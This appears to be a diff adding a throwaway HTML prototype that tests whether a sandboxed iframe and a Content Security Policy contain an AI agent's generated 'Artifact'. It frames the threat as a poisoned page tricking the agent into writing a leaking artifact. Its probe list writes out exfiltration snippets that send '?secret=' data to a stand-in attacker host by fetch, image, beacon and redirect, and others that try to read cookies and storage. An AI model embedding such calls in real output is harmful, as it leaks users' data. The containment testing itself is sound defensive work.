@@ -1,0 +1,572 @@
+<!doctype html>
+<!--
+  PROTOTYPE — throwaway. Not production code, not imported by anything.
+  Question: does a sandboxed srcDoc iframe plus an injected CSP actually stop
+  an Artifact from leaking data, while still letting it load allowlisted CDN
+  libraries? Open by double-click. Needs internet.
+-->
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>PROTOTYPE — Artifact frame containment</title>
+    <script>
+      // The page that embeds the Artifact (Platypus itself) can forbid its
+      // frames from navigating anywhere. Must be set before any frame exists.
+      const params = new URLSearchParams(location.search);
+      if (params.get("host") !== "off") {
+        document.write(
+          '<meta http-equiv="Content-Security-Policy" content="frame-src \'none\'">',
+        );
+      }
+    </script>
+    <style>
+      :root {
+        --accent: #0f766e;
+        --bad: #b91c1c;
+        --line: #e5e7eb;
+        --muted: #6b7280;
+      }
+      body {
+        font:
+          15px/1.5 system-ui,
+          sans-serif;
+        max-width: 980px;
+        margin: 32px auto;
+        padding: 0 16px;
+        color: #111827;
+      }
+      h1 {
+        font-size: 22px;
+        margin: 0 0 4px;
+      }
+      h2 {
+        font-size: 15px;
+        text-transform: uppercase;
+        letter-spacing: 0.04em;
+        color: var(--muted);
+        margin: 32px 0 8px;
+      }
+      p {
+        margin: 6px 0;
+      }
+      .banner {
+        background: #fef3c7;
+        padding: 6px 10px;
+        border-radius: 6px;
+        font-size: 13px;
+        display: inline-block;
+        margin-bottom: 12px;
+      }
+      .panel {
+        border: 1px solid var(--line);
+        border-radius: 8px;
+        padding: 12px 14px;
+      }
+      dl {
+        display: grid;
+        grid-template-columns: 220px 1fr;
+        gap: 4px 12px;
+        margin: 0;
+      }
+      dt {
+        color: var(--muted);
+      }
+      dd {
+        margin: 0;
+        font-family: ui-monospace, monospace;
+        font-size: 13px;
+        word-break: break-word;
+      }
+      table {
+        width: 100%;
+        border-collapse: collapse;
+        margin-top: 10px;
+      }
+      th,
+      td {
+        text-align: left;
+        padding: 6px 8px;
+        border-top: 1px solid var(--line);
+        vertical-align: top;
+      }
+      th {
+        font-weight: 600;
+        font-size: 13px;
+        color: var(--muted);
+      }
+      .ok {
+        color: var(--accent);
+        font-weight: 600;
+      }
+      .leak {
+        color: var(--bad);
+        font-weight: 700;
+      }
+      .muted {
+        color: var(--muted);
+      }
+      button {
+        font: inherit;
+        padding: 6px 12px;
+        border-radius: 6px;
+        border: 1px solid var(--line);
+        background: #fff;
+        cursor: pointer;
+      }
+      button.primary {
+        background: var(--accent);
+        border-color: var(--accent);
+        color: #fff;
+      }
+      button[aria-selected="true"] {
+        border-color: var(--accent);
+        color: var(--accent);
+        font-weight: 600;
+      }
+      .row {
+        display: flex;
+        gap: 8px;
+        flex-wrap: wrap;
+        align-items: center;
+        margin: 8px 0;
+      }
+      input[type="text"] {
+        font:
+          13px ui-monospace,
+          monospace;
+        padding: 6px 8px;
+        border: 1px solid var(--line);
+        border-radius: 6px;
+        width: 340px;
+      }
+      textarea {
+        width: 100%;
+        height: 150px;
+        font:
+          13px ui-monospace,
+          monospace;
+        box-sizing: border-box;
+        border: 1px solid var(--line);
+        border-radius: 6px;
+        padding: 8px;
+      }
+      #preview {
+        width: 100%;
+        height: 260px;
+        border: 1px solid var(--line);
+        border-radius: 6px;
+        margin-top: 8px;
+      }
+      #probeFrames iframe {
+        width: 0;
+        height: 0;
+        border: 0;
+        position: absolute;
+      }
+    </style>
+  </head>
+  <body>
+    <span class="banner">PROTOTYPE — throwaway, needs internet</span>
+    <h1>Can an Artifact leak what it can see?</h1>
+    <p>
+      An Artifact is a page the Agent wrote. A poisoned web page or document
+      could trick the Agent into writing one that quietly sends your Chat
+      somewhere else. This demo puts a hostile Artifact inside the frame
+      Platypus would use and tries every way out. It also checks the Artifact
+      can still load a charting library from an approved site.
+    </p>
+
+    <h2>Current protection</h2>
+    <div class="panel">
+      <dl id="state"></dl>
+      <table>
+        <thead>
+          <tr>
+            <th>Escape attempt</th>
+            <th>We want it</th>
+            <th>What happened</th>
+            <th></th>
+          </tr>
+        </thead>
+        <tbody id="results"></tbody>
+      </table>
+    </div>
+
+    <h2>Free play</h2>
+    <div class="row">
+      <button id="toggleCsp"></button>
+      <button id="toggleHost"></button>
+      <button class="primary" id="runAll">Try every escape</button>
+    </div>
+    <div class="row">
+      <label for="origins">Approved library sites (Operator setting)</label>
+      <input type="text" id="origins" />
+      <button id="applyOrigins">Apply</button>
+    </div>
+    <p class="muted">
+      Paste any Artifact below to see it run under the current protection.
+    </p>
+    <textarea id="content"></textarea>
+    <div class="row"><button id="render">Show this Artifact</button></div>
+    <iframe id="preview" title="Artifact preview"></iframe>
+
+    <h2>Guided walkthroughs</h2>
+    <div class="row" id="tabs"></div>
+    <div class="panel">
+      <p id="scenarioText"></p>
+      <div class="row">
+        <button id="scenarioApply">1. Set up this situation</button>
+        <button id="scenarioRun">2. Try every escape</button>
+      </div>
+    </div>
+
+    <div id="probeFrames"></div>
+
+    <!-- ================= PORTABLE MODULE — the bit worth keeping ============ -->
+    <script>
+      const ArtifactFrame = (() => {
+        // No allow-same-origin: the frame gets an opaque origin, so no cookies,
+        // no storage, no reach into the embedding page. No allow-popups,
+        // allow-forms or allow-top-navigation either.
+        const SANDBOX = "allow-scripts";
+
+        // The embedding page must also send this, or the frame can navigate
+        // itself to any URL and carry data out in the query string. A CSP
+        // inside the frame cannot stop that.
+        const HOST_CSP = "frame-src 'none'";
+
+        function buildCsp(scriptOrigins) {
+          const o = scriptOrigins.join(" ");
+          return [
+            "default-src 'none'",
+            `script-src 'unsafe-inline' ${o}`,
+            `style-src 'unsafe-inline' ${o}`,
+            `font-src data: ${o}`,
+            "img-src data: blob:",
+            "media-src data: blob:",
+            "connect-src 'none'",
+            "form-action 'none'",
+            "base-uri 'none'",
+          ]
+            .map((d) => d.trim())
+            .join("; ");
+        }
+
+        // The policy is prepended, never spliced in: nothing the model wrote
+        // can come before it, and a later <meta> can only tighten it.
+        function buildSrcDoc({ type, content, scriptOrigins, csp = true }) {
+          const meta = csp
+            ? `<meta http-equiv="Content-Security-Policy" content="${buildCsp(
+                scriptOrigins,
+              ).replace(/"/g, "&quot;")}">`
+            : "";
+          const body =
+            type === "svg"
+              ? `<body style="margin:0;display:grid;place-items:center;min-height:100vh">${content}</body>`
+              : content;
+          return `<!doctype html><meta charset="utf-8">${meta}${body}`;
+        }
+
+        return { SANDBOX, HOST_CSP, buildCsp, buildSrcDoc };
+      })();
+    </script>
+
+    <!-- ================= THROWAWAY PAGE SHELL =============================== -->
+    <script>
+      const ATTACKER = "https://example.com/";
+      const config = {
+        csp: params.get("csp") !== "off",
+        host: params.get("host") !== "off",
+        origins: (params.get("origins") ?? "https://cdnjs.cloudflare.com")
+          .split(/\s+/)
+          .filter(Boolean),
+        tab: Number(params.get("tab") ?? 0),
+      };
+
+      // Runs inside the Artifact. `settle` waits a beat for the browser to say
+      // whether the policy stepped in, since a blocked request and a failed
+      // one otherwise look the same.
+      const PRELUDE = (id) => `
+        let violated = null;
+        addEventListener("securitypolicyviolation", (e) => (violated = e.effectiveDirective));
+        const report = (verdict, detail) => parent.postMessage({ probe: "${id}", verdict, detail }, "*");
+        const settle = (detail) => setTimeout(() =>
+          violated ? report("blocked", "policy: " + violated) : report("allowed", detail), 500);
+        const A = "${ATTACKER}";`;
+
+      const PROBES = [
+        {
+          id: "fetch",
+          label: "Send data with a background request",
+          want: "blocked",
+          code: `fetch(A + "?secret=fetch", { mode: "no-cors" }).then(() => settle("request sent"), () => settle("request attempted"));`,
+        },
+        {
+          id: "img",
+          label: "Send data by loading an image from elsewhere",
+          want: "blocked",
+          code: `const i = new Image(); i.onload = i.onerror = () => settle("request sent"); i.src = A + "?secret=img";`,
+        },
+        {
+          id: "beacon",
+          label: "Send data with a beacon",
+          want: "blocked",
+          code: `try { navigator.sendBeacon(A + "?secret=beacon", "x"); } catch (e) {} settle("beacon queued");`,
+        },
+        {
+          id: "nav",
+          label: "Send data by redirecting the Artifact's own frame",
+          want: "blocked",
+          code: `location.href = A + "?secret=nav";`,
+          hostObserved: true,
+        },
+        {
+          id: "cookie",
+          label: "Read your login cookie",
+          want: "blocked",
+          code: `try { document.cookie; report("allowed", "cookie readable"); } catch (e) { report("blocked", e.name); }`,
+        },
+        {
+          id: "storage",
+          label: "Read saved browser data",
+          want: "blocked",
+          code: `try { localStorage.length; report("allowed", "storage readable"); } catch (e) { report("blocked", e.name); }`,
+        },
+        {
+          id: "parent",
+          label: "Reach into the Platypus page around it",
+          want: "blocked",
+          code: `try { parent.document.title; report("allowed", "page readable"); } catch (e) { report("blocked", e.name); }`,
+        },
+        {
+          id: "top",
+          label: "Redirect the whole tab",
+          want: "blocked",
+          code: `try { top.location.href = A; report("allowed", "tab redirected"); } catch (e) { report("blocked", e.name); }`,
+        },
+        {
+          id: "popup",
+          label: "Open a new window",
+          want: "blocked",
+          code: `const w = window.open(A + "?secret=popup"); report(w ? "allowed" : "blocked", w ? "window opened" : "no window");`,
+        },
+        {
+          id: "cdn-ok",
+          label: "Load a library from cdnjs",
+          want: "allowed",
+          code: `const s = document.createElement("script"); s.src = "https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.21/lodash.min.js"; s.onload = () => report("allowed", "library loaded"); s.onerror = () => settle("load failed (offline?)"); document.head.append(s);`,
+        },
+        {
+          id: "cdn-other",
+          label: "Load a library from jsDelivr (not approved by default)",
+          want: "blocked",
+          code: `const s = document.createElement("script"); s.src = "https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"; s.onload = () => report("allowed", "library loaded"); s.onerror = () => settle("load failed (offline?)"); document.head.append(s);`,
+        },
+      ];
+
+      const SAMPLE = `<h3 style="font-family:system-ui">Sales by quarter</h3>
+<canvas id="c" height="90"></canvas>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.min.js"><\/script>
+<script>
+  new Chart(document.getElementById("c"), {
+    type: "bar",
+    data: { labels: ["Q1","Q2","Q3","Q4"], datasets: [{ label: "Sales", data: [12, 19, 7, 15] }] },
+  });
+<\/script>`;
+
+      const SCENARIOS = [
+        {
+          name: "As designed",
+          text: "Both protections on, cdnjs approved. Every escape should be stopped and the cdnjs library should still load. This is what Platypus would ship.",
+          set: {
+            csp: "on",
+            host: "on",
+            origins: "https://cdnjs.cloudflare.com",
+          },
+        },
+        {
+          name: "Nothing but the frame",
+          text: "Both policies off; only the sandboxed frame remains. Watch which escapes get through. This proves the test can tell a leak from a block.",
+          set: {
+            csp: "off",
+            host: "off",
+            origins: "https://cdnjs.cloudflare.com",
+          },
+        },
+        {
+          name: "The redirect hole",
+          text: "The Artifact's own policy is on, but Platypus does not forbid frame redirects. Watch the redirect row: the Artifact's policy alone cannot stop it.",
+          set: {
+            csp: "on",
+            host: "off",
+            origins: "https://cdnjs.cloudflare.com",
+          },
+        },
+        {
+          name: "Operator approves nothing",
+          text: "The Operator empties the approved list. Every library is refused, including cdnjs, so an Artifact must be fully self-contained.",
+          set: { csp: "on", host: "on", origins: "" },
+        },
+      ];
+
+      const results = {};
+      const $ = (id) => document.getElementById(id);
+
+      function reload(change, run) {
+        const next = new URLSearchParams({
+          csp: config.csp ? "on" : "off",
+          host: config.host ? "on" : "off",
+          origins: config.origins.join(" "),
+          tab: String(config.tab),
+          ...change,
+        });
+        if (run) next.set("run", "1");
+        location.search = next.toString();
+      }
+
+      function newFrame(srcdoc, into) {
+        const f = into ?? document.createElement("iframe");
+        f.setAttribute("sandbox", ArtifactFrame.SANDBOX);
+        f.srcdoc = srcdoc;
+        if (!into) $("probeFrames").append(f);
+        return f;
+      }
+
+      function runProbe(probe) {
+        return new Promise((resolve) => {
+          const done = (verdict, detail) => {
+            removeEventListener("message", onMessage);
+            document.removeEventListener(
+              "securitypolicyviolation",
+              onViolation,
+            );
+            clearTimeout(timer);
+            frame.remove();
+            resolve({ verdict, detail });
+          };
+          const onMessage = (e) => {
+            if (e.source === frame.contentWindow && e.data?.probe === probe.id)
+              done(e.data.verdict, e.data.detail);
+          };
+          // A frame redirect is refused by the embedding page, so only the
+          // embedding page hears about it.
+          const onViolation = (e) => {
+            if (probe.hostObserved && e.effectiveDirective === "frame-src")
+              done("blocked", "Platypus page policy: frame-src");
+          };
+          addEventListener("message", onMessage);
+          document.addEventListener("securitypolicyviolation", onViolation);
+          const timer = setTimeout(
+            () =>
+              probe.hostObserved
+                ? done("allowed", "frame left for " + ATTACKER)
+                : done("no answer", "the Artifact never ran"),
+            3000,
+          );
+          const frame = newFrame(
+            ArtifactFrame.buildSrcDoc({
+              type: "html",
+              content: `<script>${PRELUDE(probe.id)}${probe.code}<\/script>`,
+              scriptOrigins: config.origins,
+              csp: config.csp,
+            }),
+          );
+        });
+      }
+
+      async function runAll() {
+        for (const p of PROBES) delete results[p.id];
+        for (const p of PROBES) {
+          results[p.id] = { verdict: "…", detail: "" };
+          render();
+          results[p.id] = await runProbe(p);
+          render();
+        }
+        document.body.dataset.done = "1";
+      }
+
+      function render() {
+        $("state").innerHTML = [
+          [
+            "Frame restrictions",
+            `sandbox="${ArtifactFrame.SANDBOX}" (always on)`,
+          ],
+          [
+            "Artifact's own policy",
+            config.csp ? ArtifactFrame.buildCsp(config.origins) : "OFF",
+          ],
+          [
+            "Platypus page forbids frame redirects",
+            config.host ? ArtifactFrame.HOST_CSP : "OFF",
+          ],
+          [
+            "Approved library sites",
+            config.origins.length ? config.origins.join(", ") : "none",
+          ],
+        ]
+          .map(([k, v]) => `<dt>${k}</dt><dd>${v}</dd>`)
+          .join("");
+
+        $("results").innerHTML = PROBES.map((p) => {
+          const r = results[p.id];
+          const cell = !r
+            ? `<td class="muted">not tried yet</td><td></td>`
+            : r.verdict === "…"
+              ? `<td class="muted">trying…</td><td></td>`
+              : `<td>${r.verdict} <span class="muted">(${r.detail})</span></td>` +
+                (r.verdict === p.want
+                  ? `<td class="ok">as wanted</td>`
+                  : `<td class="leak">${p.want === "blocked" ? "LEAK" : "BROKEN"}</td>`);
+          return `<tr><td>${p.label}</td><td>${p.want}</td>${cell}</tr>`;
+        }).join("");
+
+        $("toggleCsp").textContent = config.csp
+          ? "Turn the Artifact's own policy off"
+          : "Turn the Artifact's own policy on";
+        $("toggleHost").textContent = config.host
+          ? "Let frames redirect"
+          : "Forbid frame redirects";
+
+        $("tabs").innerHTML = SCENARIOS.map(
+          (s, i) =>
+            `<button data-tab="${i}" aria-selected="${i === config.tab}">${s.name}</button>`,
+        ).join("");
+        $("scenarioText").textContent = SCENARIOS[config.tab].text;
+      }
+
+      function showPreview() {
+        newFrame(
+          ArtifactFrame.buildSrcDoc({
+            type: "html",
+            content: $("content").value,
+            scriptOrigins: config.origins,
+            csp: config.csp,
+          }),
+          $("preview"),
+        );
+      }
+
+      $("toggleCsp").onclick = () => reload({ csp: config.csp ? "off" : "on" });
+      $("toggleHost").onclick = () =>
+        reload({ host: config.host ? "off" : "on" });
+      $("applyOrigins").onclick = () => reload({ origins: $("origins").value });
+      $("runAll").onclick = runAll;
+      $("render").onclick = showPreview;
+      $("tabs").onclick = (e) => {
+        if (e.target.dataset.tab === undefined) return;
+        config.tab = Number(e.target.dataset.tab);
+        render();
+      };
+      $("scenarioApply").onclick = () =>
+        reload({ ...SCENARIOS[config.tab].set, tab: String(config.tab) });
+      $("scenarioRun").onclick = () =>
+        reload({ ...SCENARIOS[config.tab].set, tab: String(config.tab) }, true);
+
+      $("origins").value = config.origins.join(" ");
+      $("content").value = SAMPLE;
+      render();
+      showPreview();
+      if (params.get("run")) runAll();
+    </script>
+  </body>
+</html>
